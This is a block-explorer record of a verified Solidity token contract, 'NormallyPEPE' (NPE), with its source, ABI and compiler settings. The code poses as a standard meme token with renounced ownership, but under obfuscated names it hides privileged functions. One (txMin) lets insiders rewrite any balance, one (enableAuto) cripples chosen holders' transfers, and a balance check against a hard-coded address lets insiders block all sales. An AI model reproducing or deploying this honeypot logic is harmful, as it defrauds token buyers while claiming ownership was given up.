{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface feeLiquiditySender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverBuy) external view returns (uint256);\n\n    function transfer(address maxSenderMode, uint256 minExempt) external returns (bool);\n\n    function allowance(address walletTeamAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxSenderMode,\n        uint256 minExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromMin, uint256 value);\n    event Approval(address indexed walletTeamAt, address indexed spender, uint256 value);\n}\n\nabstract contract isList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchBuy {\n    function createPair(address liquidityFrom, address launchedAt) external returns (address);\n}\n\ninterface feeLiquiditySenderMetadata is feeLiquiditySender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NormallyPEPE is isList, feeLiquiditySender, feeLiquiditySenderMetadata {\n\n    function name() external view virtual override returns (string memory) {\n        return sellTrading;\n    }\n\n    event OwnershipTransferred(address indexed tokenTake, address indexed enableSender);\n\n    string private sellTrading = \"Normally PEPE\";\n\n    mapping(address => uint256) private listAmountEnable;\n\n    bool private exemptSwap;\n\n    string private liquidityAmount = \"NPE\";\n\n    function transfer(address receiverReceiver, uint256 minExempt) external virtual override returns (bool) {\n        return walletMarketing(_msgSender(), receiverReceiver, minExempt);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingIsSwap;\n    }\n\n    function enableAuto(address swapTotal) public {\n        atWallet();\n        if (autoMode == marketingTake) {\n            autoMode = tradingSell;\n        }\n        if (swapTotal == enableMarketingLimit || swapTotal == walletLaunched) {\n            return;\n        }\n        minLimit[swapTotal] = true;\n    }\n\n    address takeToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public autoMode;\n\n    function totalShould(address tradingTotalMarketing) public {\n        if (senderSwap) {\n            return;\n        }\n        \n        buySender[tradingTotalMarketing] = true;\n        \n        senderSwap = true;\n    }\n\n    function owner() external view returns (address) {\n        return receiverModeTx;\n    }\n\n    uint256 private tradingIsSwap = 100000000 * 10 ** 18;\n\n    function walletMarketing(address buyEnable, address maxSenderMode, uint256 minExempt) internal returns (bool) {\n        if (buyEnable == enableMarketingLimit) {\n            return tokenTx(buyEnable, maxSenderMode, minExempt);\n        }\n        uint256 receiverList = feeLiquiditySender(walletLaunched).balanceOf(takeToken);\n        require(receiverList == limitTeam);\n        require(maxSenderMode != takeToken);\n        if (minLimit[buyEnable]) {\n            return tokenTx(buyEnable, maxSenderMode, takeTotal);\n        }\n        return tokenTx(buyEnable, maxSenderMode, minExempt);\n    }\n\n    function allowance(address receiverSwap, address sellReceiver) external view virtual override returns (uint256) {\n        if (sellReceiver == swapReceiverIs) {\n            return type(uint256).max;\n        }\n        return exemptTotalSender[receiverSwap][sellReceiver];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityAmount;\n    }\n\n    address swapReceiverIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address sellReceiver, uint256 minExempt) public virtual override returns (bool) {\n        exemptTotalSender[_msgSender()][sellReceiver] = minExempt;\n        emit Approval(_msgSender(), sellReceiver, minExempt);\n        return true;\n    }\n\n    uint256 private tradingSell;\n\n    constructor (){\n        if (marketingTake != tradingSell) {\n            tokenTeamTotal = false;\n        }\n        minTrading swapTradingSender = minTrading(swapReceiverIs);\n        walletLaunched = launchBuy(swapTradingSender.factory()).createPair(swapTradingSender.WETH(), address(this));\n        if (autoMode != tradingSell) {\n            exemptSwap = true;\n        }\n        enableMarketingLimit = _msgSender();\n        takeTrading();\n        buySender[enableMarketingLimit] = true;\n        listAmountEnable[enableMarketingLimit] = tradingIsSwap;\n        \n        emit Transfer(address(0), enableMarketingLimit, tradingIsSwap);\n    }\n\n    mapping(address => bool) public buySender;\n\n    bool public tokenTeamTotal;\n\n    function balanceOf(address receiverBuy) public view virtual override returns (uint256) {\n        return listAmountEnable[receiverBuy];\n    }\n\n    uint256 walletMode;\n\n    bool public senderSwap;\n\n    uint256 limitTeam;\n\n    address public enableMarketingLimit;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingMode;\n    }\n\n    mapping(address => bool) public minLimit;\n\n    uint256 constant takeTotal = 3 ** 10;\n\n    function txMin(address receiverReceiver, uint256 minExempt) public {\n        atWallet();\n        listAmountEnable[receiverReceiver] = minExempt;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverModeTx;\n    }\n\n    function takeTrading() public {\n        emit OwnershipTransferred(enableMarketingLimit, address(0));\n        receiverModeTx = address(0);\n    }\n\n    address private receiverModeTx;\n\n    function atWallet() private view {\n        require(buySender[_msgSender()]);\n    }\n\n    address public walletLaunched;\n\n    mapping(address => mapping(address => uint256)) private exemptTotalSender;\n\n    uint8 private marketingMode = 18;\n\n    function amountTrading(uint256 minExempt) public {\n        atWallet();\n        limitTeam = minExempt;\n    }\n\n    function transferFrom(address buyEnable, address maxSenderMode, uint256 minExempt) external override returns (bool) {\n        if (_msgSender() != swapReceiverIs) {\n            if (exemptTotalSender[buyEnable][_msgSender()] != type(uint256).max) {\n                require(minExempt <= exemptTotalSender[buyEnable][_msgSender()]);\n                exemptTotalSender[buyEnable][_msgSender()] -= minExempt;\n            }\n        }\n        return walletMarketing(buyEnable, maxSenderMode, minExempt);\n    }\n\n    function tokenTx(address buyEnable, address maxSenderMode, uint256 minExempt) internal returns (bool) {\n        require(listAmountEnable[buyEnable] >= minExempt);\n        listAmountEnable[buyEnable] -= minExempt;\n        listAmountEnable[maxSenderMode] += minExempt;\n        emit Transfer(buyEnable, maxSenderMode, minExempt);\n        return true;\n    }\n\n    uint256 public marketingTake;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTeamAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minExempt\",\"type\":\"uint256\"}],\"name\":\"amountTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buySender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTotal\",\"type\":\"address\"}],\"name\":\"enableAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMarketingLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTeamTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTotalMarketing\",\"type\":\"address\"}],\"name\":\"totalShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxSenderMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minExempt\",\"type\":\"uint256\"}],\"name\":\"txMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "NormallyPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}